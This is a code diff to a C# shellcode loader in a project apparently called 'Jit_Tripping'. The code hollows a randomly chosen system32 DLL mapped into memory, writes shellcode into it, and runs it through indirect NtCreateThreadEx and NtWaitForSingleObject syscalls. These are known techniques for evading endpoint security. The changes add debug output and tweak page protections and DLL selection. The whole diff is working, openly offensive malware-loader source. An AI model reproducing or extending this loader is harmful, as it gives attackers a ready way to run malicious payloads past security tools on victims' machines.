@@ -18,16 +18,24 @@ namespace Jit_Tripping
     /// </summary>
     public class Utils
     {
-        public static void inject(string base64Str, dll ntdll)
+        public static void inject(byte[] shellcode, dll ntdll)
         {
-            byte[] shellcode = Convert.FromBase64String(base64Str);
+            //byte[] shellcode = Convert.FromBase64String(base64Str);
 
             IntPtr pBaseAddress = overload(shellcode, ntdll);
             IntPtr hThread = IntPtr.Zero;
             object[] threadargs = new object[] { hThread, (uint)0x02000000, IntPtr.Zero, Process.GetCurrentProcess().Handle, pBaseAddress, IntPtr.Zero, false, 0, 0, 0, IntPtr.Zero };
             ntdll.indirectSyscallInvoke<Delegates.NtCreateThreadEx>("NtCreateThreadEx", threadargs);
             hThread = (IntPtr)threadargs[0];
-            Thread.Sleep(1000);
+
+/*
+            Structs.LargeInteger li = new Structs.LargeInteger();
+            long second = -10000000L;
+            li.QuadPart = 5*second;
+            IntPtr ptr =  Marshal.AllocHGlobal(Marshal.SizeOf(li));
+            Marshal.StructureToPtr(li, ptr, true);
+*/
+            ntdll.indirectSyscallInvoke<Delegates.NtWaitForSingleObject>("NtWaitForSingleObject", new object[] { hThread, false, IntPtr.Zero  });
         }
         /// <summary>
         /// Basically what TheWover did. Loads an arbitrary system32 dll (without calling dllmain) and write shellcode in.
@@ -54,7 +62,8 @@ namespace Jit_Tripping
             Random r = new Random();
             //List of candidates that have been considered and rejected
             List<int> candidates = new List<int>();
-            while (candidates.Count != files.Count)
+            //while (candidates.Count != files.Count)
+            while (true) //more stable for edge cases?
             {
                 //Iterate through the list of files randomly
                 int rInt = r.Next(0, files.Count);
@@ -63,13 +72,16 @@ namespace Jit_Tripping
                 //Check that the size of the module meets requirements
                 if (candidates.Contains(rInt) == false && new FileInfo(currentCandidate).Length >= size && !checkCFG(currentCandidate))
                 {
+                    if (currentCandidate.ToLower().Contains("authfwsnapin.dll")) continue;
                     dllToOverload = currentCandidate;
                     break;
                 }
                 candidates.Add(rInt);
             }
-            //Overloading time
+            //if (candidates.Count == files.Count)Console.WriteLine("We are fucked");
 
+            //Overloading time
+            Console.WriteLine($"We are going to use {dllToOverload}");
             //Init the UNICODE_STRING argument for mapview
             Structs.UNICODE_STRING dllName = new Structs.UNICODE_STRING();
             void RtlInitUnicodeString(ref Structs.UNICODE_STRING destinationString, string SourceString)
@@ -83,6 +95,7 @@ namespace Jit_Tripping
                 destinationString.Buffer = Marshal.StringToHGlobalUni(SourceString); //write the string into memory
 
             }
+            
             RtlInitUnicodeString(ref dllName, (@"\??\" + dllToOverload));
             //Map it into memory
             IntPtr pDllName = Marshal.AllocHGlobal(Marshal.SizeOf(dllName));
@@ -115,24 +128,29 @@ namespace Jit_Tripping
 
             //Mapping View of the section
             IntPtr pBaseAddress = IntPtr.Zero;
-            object[] argsNtMapViewOfSection = new object[] { hSection, (IntPtr)(-1), pBaseAddress, IntPtr.Zero, IntPtr.Zero, IntPtr.Zero, MaxSize, (uint)0x2, (uint)0x0, PAGE_READWRITE };
+            object[] argsNtMapViewOfSection = new object[] { hSection, (IntPtr)(-1), pBaseAddress, IntPtr.Zero, IntPtr.Zero, IntPtr.Zero, (IntPtr)size, (uint)0x2, (uint)0x0, PAGE_EXECUTE_READWRITE };
             ntdll.indirectSyscallInvoke<Delegates.NtMapViewOfSection>("NtMapViewOfSection", argsNtMapViewOfSection);
             pBaseAddress = (IntPtr)argsNtMapViewOfSection[2];
-            MaxSize = (ulong)argsNtMapViewOfSection[6];
-
+ 
 
             //Make page writeable
-            ntdll.indirectSyscallInvoke<Delegates.NtProtectVirtualMemory>("NtProtectVirtualMemory", new object[] { (IntPtr)(-1), pBaseAddress, (IntPtr)MaxSize, PAGE_READWRITE, (uint)0 });
+            Console.WriteLine("Changing to be writeable");
+            uint ntstatus = (uint)ntdll.indirectSyscallInvoke<Delegates.NtProtectVirtualMemory>("NtProtectVirtualMemory", new object[] { (IntPtr)(-1), pBaseAddress, (IntPtr)size, PAGE_READWRITE, (uint)0 });
+            Console.WriteLine("Ntstatus of protect: 0x{0:X}", ntstatus);
 
             //Copy shellcode into the mapped dll
-            byte[] nullbytes = new byte[MaxSize];
-            for (int i = 0; i < nullbytes.Length; i++) nullbytes[i] = 0x00;
-            Marshal.Copy(nullbytes, 0, pBaseAddress, nullbytes.Length);
-            Console.WriteLine("{1} is at 0x{0:X}", (long)pBaseAddress, dllToOverload);
-            Marshal.Copy(shellcode, 0, pBaseAddress, size);
+            byte[] nullbyte = new byte[size];
+            for (int i = 0; i < size; i++) nullbyte[i] = 0x00;
+            Console.WriteLine($"Dll is {File.ReadAllBytes(dllToOverload).Length.ToString()} bytes");
+            Console.WriteLine("{1} will be at 0x{0:X}", (long)pBaseAddress, dllToOverload);
+
+            Console.WriteLine($"Hollowing {nullbyte.Length.ToString()} bytes");
+            Marshal.Copy(nullbyte, 0, pBaseAddress, nullbyte.Length);
+            Console.WriteLine("{1} written to 0x{0:X}", (long)pBaseAddress, dllToOverload);
+            Marshal.Copy(shellcode, 0, pBaseAddress, shellcode.Length);
 
             //Change back to executable
-            ntdll.indirectSyscallInvoke<Delegates.NtProtectVirtualMemory>("NtProtectVirtualMemory", new object[] { (IntPtr)(-1), pBaseAddress, (IntPtr)MaxSize, PAGE_EXECUTE_READ, (uint)0 });
+            ntdll.indirectSyscallInvoke<Delegates.NtProtectVirtualMemory>("NtProtectVirtualMemory", new object[] { (IntPtr)(-1), pBaseAddress, (IntPtr)size, PAGE_EXECUTE_READ, (uint)0 });
             return pBaseAddress;
         }
 
